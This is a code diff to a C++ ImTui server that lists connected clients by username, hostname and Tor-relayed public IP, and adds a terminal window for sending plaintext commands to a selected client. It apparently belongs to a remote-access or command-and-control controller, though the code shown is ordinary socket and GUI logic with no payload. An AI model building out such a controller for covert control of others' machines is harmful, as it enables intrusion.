@@ -14,6 +14,7 @@
 #include <algorithm>
 #include <iostream>
 #include <signal.h>
+#include <fcntl.h>
 
 #define perror_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)
 
@@ -29,18 +30,24 @@
 class connection{
 public: // Making everything public temporarily
     int sockFd = -1; // Socket file descriptor - assumed to be valid when the object is created
-    struct sockaddr_in address; // Address of the client
+    struct sockaddr_in address; // Address structure for the client
     int addrlen; // Length of the address
     std::string username;
     std::string hostname;
     std::string publicIp; // Public IP of the client - sent by the client since we can't get it from the socket due to the usage of TOR
     std::mutex sockFdMutex; // Only one thread can use the socket file descriptor at a time
     bool lastConnectivityCheck = false; // Last result of the connectivity check
+    bool terminalActive = false;
+    std::vector<std::string> plainTextMessageHistory;
+    int selectedMessage = 0;
+    char inputBuffer[1024] = {0};
+    std::string msgToSend = "";
+
 
     /*
         Constructor
     */
-   connection(int sockFd, struct sockaddr_in address, int addrlen){
+    connection(int sockFd, struct sockaddr_in address, int addrlen){
        this->sockFd = sockFd;
        this->address = address;
        this->addrlen = addrlen;
@@ -68,6 +75,60 @@ public: // Making everything public temporarily
         ImGui::Text("Public IP: %s", this->publicIp.c_str());
         ImGui::Text("Connectivity: %s", (this->lastConnectivityCheck)?"OK":"ERR");
         ImGui::End();
+    }
+
+    void drawTerminalWindow(){
+        ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Once);
+        ImGui::SetNextWindowSize(ImVec2(35, 10), ImGuiCond_Once);
+        ImGui::Begin(("Socket " + std::to_string(this->sockFd) + " terminal").c_str());
+        ImGui::BeginChild("Scrolling", ImVec2(0, -3), false);
+        for(auto m : this->plainTextMessageHistory){
+            ImGui::TextWrapped("%s", m.c_str());
+        }
+        if(ImGui::GetScrollY() >= ImGui::GetScrollMaxY()){
+            ImGui::SetScrollHereY(1.0f);
+        }
+        ImGui::EndChild();
+        ImGui::Separator();
+        if(ImGui::InputText("Input", this->inputBuffer, 1024, ImGuiInputTextFlags_EnterReturnsTrue)){
+            this->msgToSend = std::string(this->inputBuffer);
+        }
+        ImGui::End();
+    }
+
+    void sendMsgPlaintext(std::string msg){
+        this->sockFdMutex.lock();
+        int bytesSent = send(this->sockFd, msg.c_str(), msg.length(), 0);
+        this->sockFdMutex.unlock();
+        if(bytesSent < 0){
+            this->msgToSend = "Error sending message: " + std::to_string(bytesSent);
+            return;
+        }
+        this->plainTextMessageHistory.push_back("Sent: " + msg);
+        this->msgToSend = "";
+    }
+
+    void update(){
+        if(this->terminalActive){
+            this->drawTerminalWindow();
+        }
+        if(this->msgToSend != ""){
+            this->sendMsgPlaintext(this->msgToSend);
+        }
+    }
+
+    void closeTerminal(){ // Does a little cleanup, ! does not close the socket !
+        this->terminalActive = false;
+        // Read all the data from the socket to ensure the ping-pong works
+        // Do so in non-blocking mode
+        char buffer[1024] = {0};
+        int bytesReceived = 0;
+        int flags = fcntl(this->sockFd, F_GETFL, 0);
+        fcntl(this->sockFd, F_SETFL, flags | O_NONBLOCK);
+        do{
+            bytesReceived = recv(this->sockFd, buffer, 1024, 0);
+        }while(bytesReceived > 0);
+        fcntl(this->sockFd, F_SETFL, flags);
     }
 
     bool connectivityCheck(){
@@ -116,63 +177,6 @@ public: // Making everything public temporarily
         this->sockFdMutex.unlock();
         return true; // TODO: Properly verify the data received is valid
     }
-};
-
-
-/*
-    Class for a terminal window
-*/
-class terminal{
-public: // testing purpose :D
-    std::unique_ptr<connection> conn; // Pointer to the connection that this terminal is connected to
-    std::vector<std::string> terminalBuffer; // Buffer for the terminal - holds the lines of text to be displayed
-    std::mutex terminalBufferMutex; // Mutex for the terminal buffer
-    char inputBuffer[2048] = {0}; // Buffer for the input box
-
-    /*
-        Constructor
-    */
-    terminal(std::unique_ptr<connection> conn){
-        this->conn = std::move(conn);
-        this->conn->sockFdMutex.lock(); // We are just going to lock the socket file descriptor for the duration of the terminal
-        // This ensures that the terminal class is the only thing using the socket file descriptor
-        // Since we know the mutex is locked (for this class) as soon as the class is created, we dont need to bother checking it in any of the other functions
-    }
-
-    ~terminal(){
-        this->conn->sockFdMutex.unlock();
-    }
-
-    // This function is used to take the conn pointer back from the terminal class
-    std::unique_ptr<connection> getConn(){
-        return std::move(this->conn);
-    }
-
-    void processCommand(){
-
-    }
-
-    void drawTerminalWindow(){
-        ImGui::SetNextWindowPos(ImVec2(0, 0), ImGuiCond_Once);
-        ImGui::SetNextWindowSize(ImVec2(25, 6), ImGuiCond_Once);
-        ImGui::Begin(("Terminal " + std::to_string(this->conn->sockFd)).c_str());
-        ImGui::BeginChild("Terminal buffer", ImVec2(0, -3), false);
-        for(std::string line : this->terminalBuffer){
-            ImGui::TextWrapped(line.c_str());
-        }
-        if(ImGui::GetScrollY() >= ImGui::GetScrollMaxY()){
-            ImGui::SetScrollHereY(1.0f);
-        }
-        ImGui::EndChild();
-        ImGui::Separator();
-        if(ImGui::InputText("cmd input", this->inputBuffer, IM_ARRAYSIZE(this->inputBuffer), ImGuiInputTextFlags_EnterReturnsTrue)){
-            // Call command processing function
-            this->processCommand();
-        }
-        ImGui::End();
-    }
-
-
 };
 
 
@@ -272,6 +276,18 @@ public: // Also making everything public temporarily
         ImGui::End();
     }
 
+    void update(){
+        this->connectionsMutex.lock();
+        for(int i=0; i<this->connections.size(); i++){
+            if(i != this->selectedConnection && this->connections[i]->terminalActive){
+                this->connections[i]->closeTerminal();
+            }
+            this->connections[i]->terminalActive = (i==this->selectedConnection)?true:false;
+            this->connections[i]->update();
+        }
+        this->connectionsMutex.unlock();
+    }
+
     /*
         Function that the listener thread runs
         Places new connections into the connections vector, does nothing else.
@@ -323,6 +339,9 @@ public: // Also making everything public temporarily
                     i--;
                     continue;
                 }
+                if(this->connections[i]->terminalActive){
+                    continue;
+                }
                 if(!this->connections[i]->connectivityCheck()){
                     this->connections.erase(this->connections.begin() + i);
                     i--;
@@ -358,6 +377,7 @@ int main() {
         ImTui_ImplText_NewFrame();
         ImGui::NewFrame();
 
+        serverInstance.update();
         serverInstance.draw();
 
         // Update and render
